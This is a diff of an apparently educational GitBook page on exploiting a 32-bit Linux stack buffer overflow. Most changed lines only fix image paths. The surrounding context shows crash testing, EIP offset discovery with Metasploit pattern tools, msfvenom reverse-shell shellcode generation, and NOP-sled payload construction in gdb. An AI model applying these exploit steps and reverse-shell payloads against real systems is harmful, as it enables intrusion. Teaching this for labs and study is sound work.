@@ -8,7 +8,7 @@ _In other words, too much information is being passed into a container that does
 Buffer overflows can be exploited by attackers with a goal of modifying a computer’s memory in order to undermine or take control of program execution.
 {% endhint %}
 
-![BOF](<../.gitbook/assets/image (63).png>)
+![BOF](<../../.gitbook/assets/image (63).png>)
 
 ### Check file type
 
@@ -16,15 +16,15 @@ Buffer overflows can be exploited by attackers with a goal of modifying a comput
 file bow32 | tr "," "\n"
 ```
 
-
+***
 
 ### How to attack ?
 
-![](<../.gitbook/assets/image (39).png>)
+![](<../../.gitbook/assets/image (39).png>)
 
 #### 1 : Testing the Crash
 
-![](<../.gitbook/assets/image (114).png>)
+![](<../../.gitbook/assets/image (114).png>)
 
 ```bash
 #Python command to BOF
@@ -36,7 +36,7 @@ info registers eip
 
 #### 2 : Finding the EIP Offset
 
-![](<../.gitbook/assets/image (13).png>)
+![](<../../.gitbook/assets/image (13).png>)
 
 ```bash
 # Generate a more precise pattern
@@ -52,7 +52,7 @@ info registers eip
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
 ```
 
-![](<../.gitbook/assets/image (146).png>)
+![](<../../.gitbook/assets/image (146).png>)
 
 #### 3 : Finding Shellcode Space : General
 
@@ -69,7 +69,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform l
 
 #### 5 : Finding Shellcode Space : Garbage + NOPs + Payload + EIP
 
-![](<../.gitbook/assets/image (2) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (2) (1) (1) (1).png>)
 
 ```bash
     # Pre-final padding (Garbage - NOPs - Payload - EIP)
@@ -85,7 +85,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform l
 run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
 ```
 
-![](<../.gitbook/assets/image (116).png>)
+![](<../../.gitbook/assets/image (116).png>)
 
 #### 6 : Testing for Bad Chars
 
@@ -131,7 +131,7 @@ x/2000xb $esp+500
 # Check image below
 ```
 
-![](<../.gitbook/assets/image (18).png>)
+![](<../../.gitbook/assets/image (18).png>)
 
 #### 1 : Final Stage Payload
 
@@ -155,11 +155,11 @@ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c -
 run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
 ```
 
-![](<../.gitbook/assets/image (9) (1).png>)
+![](<../../.gitbook/assets/image (9) (1).png>)
 
 ⚡ **Choose an address to which we refer the EIP and which reads and executes one byte after the other starting at this address.**
 
-![](<../.gitbook/assets/image (40).png>)
+![](<../../.gitbook/assets/image (40).png>)
 
 #### 🚨 **Execute the Payload | Rain Hell on 'em** 🚨
 
@@ -187,11 +187,11 @@ info registers eip
 i r $eip
 ```
 
-![](<../.gitbook/assets/image (36).png>)
+![](<../../.gitbook/assets/image (36).png>)
 
-![](<../.gitbook/assets/image (81).png>)
+![](<../../.gitbook/assets/image (81).png>)
 
-![](<../.gitbook/assets/image (74).png>)
+![](<../../.gitbook/assets/image (74).png>)
 
 ### How to protect ?
 
